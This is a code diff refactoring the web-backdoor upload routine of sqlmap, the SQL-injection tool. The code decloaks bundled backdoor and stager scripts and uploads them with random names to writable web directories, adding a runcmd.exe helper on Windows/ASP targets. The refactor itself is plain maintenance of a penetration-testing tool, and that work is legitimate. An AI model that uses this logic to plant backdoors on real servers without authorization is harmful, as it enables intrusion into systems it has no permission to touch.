@@ -5,10 +5,10 @@ Copyright (c) 2006-2012 sqlmap developers (http://sqlmap.org/)
 See the file 'doc/COPYING' for copying permission
 """
 
-import codecs
 import os
 import posixpath
 import re
+import StringIO
 
 from tempfile import mkstemp
 
@@ -16,7 +16,6 @@ from extra.cloak.cloak import decloak
 from lib.core.agent import agent
 from lib.core.common import arrayizeValue
 from lib.core.common import Backend
-from lib.core.common import decloakToNamedStream
 from lib.core.common import extractRegexResult
 from lib.core.common import getDirs
 from lib.core.common import getDocRoot
@@ -82,15 +81,24 @@ class Web:
 
         return output
 
-    def webFileUpload(self, fileToUpload, destFileName, directory):
-        inputFP = codecs.open(fileToUpload, "rb")
-        retVal = self._webFileStreamUpload(inputFP, destFileName, directory)
-        inputFP.close()
-
-        return retVal
+    def webUpload(self, destFileName, directory, stream=None, content=None, filepath=None):
+        if filepath is not None:
+            if filepath.endswith('_'):
+                content = decloak(filepath)  # cloaked file
+            else:
+                with open(filepath, "rb") as f:
+                    content = f.read()
+        if content is not None:
+            stream = StringIO.StringIO(content)  # string content
+        return self._webFileStreamUpload(stream, destFileName, directory)
 
     def _webFileStreamUpload(self, stream, destFileName, directory):
         stream.seek(0) # Rewind
+
+        try:
+            setattr(stream, "name", destFileName)
+        except TypeError:
+            pass
 
         if self.webApi in getPublicTypeMembers(WEB_API, True):
             multipartParams = {
@@ -156,10 +164,7 @@ class Web:
                 break
 
         if not default:
-            if Backend.isOs(OS.WINDOWS):
-                default = WEB_API.ASP
-            else:
-                default = WEB_API.PHP
+            default = WEB_API.ASP if Backend.isOs(OS.WINDOWS) else WEB_API.PHP
 
         message = "which web application language does the web server "
         message += "support?\n"
@@ -190,8 +195,7 @@ class Web:
         directories = sorted(getDirs())
 
         backdoorName = "tmpb%s.%s" % (randomStr(lowercase=True), self.webApi)
-        backdoorStream = decloakToNamedStream(os.path.join(paths.SQLMAP_SHELL_PATH, "backdoor.%s_" % self.webApi), backdoorName)
-        originalBackdoorContent = backdoorContent = backdoorStream.read()
+        backdoorContent = decloak(os.path.join(paths.SQLMAP_SHELL_PATH, "backdoor.%s_" % self.webApi))
 
         stagerName = "tmpu%s.%s" % (randomStr(lowercase=True), self.webApi)
         stagerContent = decloak(os.path.join(paths.SQLMAP_SHELL_PATH, "stager.%s_" % self.webApi))
@@ -291,8 +295,6 @@ class Web:
                 logger.info(infoMsg)
 
                 if self.webApi == WEB_API.ASP:
-                    runcmdName = "tmpe%s.exe" % randomStr(lowercase=True)
-                    runcmdStream = decloakToNamedStream(os.path.join(paths.SQLMAP_SHELL_PATH, 'runcmd.exe_'), runcmdName)
                     match = re.search(r'input type=hidden name=scriptsdir value="([^"]+)"', uplPage)
 
                     if match:
@@ -300,21 +302,16 @@ class Web:
                     else:
                         continue
 
-                    backdoorContent = originalBackdoorContent.replace("WRITABLE_DIR", backdoorDirectory).replace("RUNCMD_EXE", runcmdName)
-                    backdoorStream.truncate()
-                    backdoorStream.read()
-                    backdoorStream.seek(0)
-                    backdoorStream.write(backdoorContent)
-
-                    if self._webFileStreamUpload(backdoorStream, backdoorName, backdoorDirectory):
-                        self._webFileStreamUpload(runcmdStream, runcmdName, backdoorDirectory)
+                    _ = "tmpe%s.exe" % randomStr(lowercase=True)
+                    if self.webUpload(backdoorName, backdoorDirectory, content=backdoorContent.replace("WRITABLE_DIR", backdoorDirectory).replace("RUNCMD_EXE", _)):
+                        self.webUpload(_, backdoorDirectory, filepath=os.path.join(paths.SQLMAP_SHELL_PATH, 'runcmd.exe_'))
                         self.webBackdoorUrl = "%s/Scripts/%s" % (self.webBaseUrl, backdoorName)
                         self.webDirectory = backdoorDirectory
                     else:
                         continue
 
                 else:
-                    if not self._webFileStreamUpload(backdoorStream, backdoorName, posixToNtSlashes(localPath) if Backend.isOs(OS.WINDOWS) else localPath):
+                    if not self.webUpload(backdoorName, posixToNtSlashes(localPath) if Backend.isOs(OS.WINDOWS) else localPath, content=backdoorContent):
                         warnMsg = "backdoor has not been successfully uploaded "
                         warnMsg += "through the file stager possibly because "
                         warnMsg += "the user running the web server process "
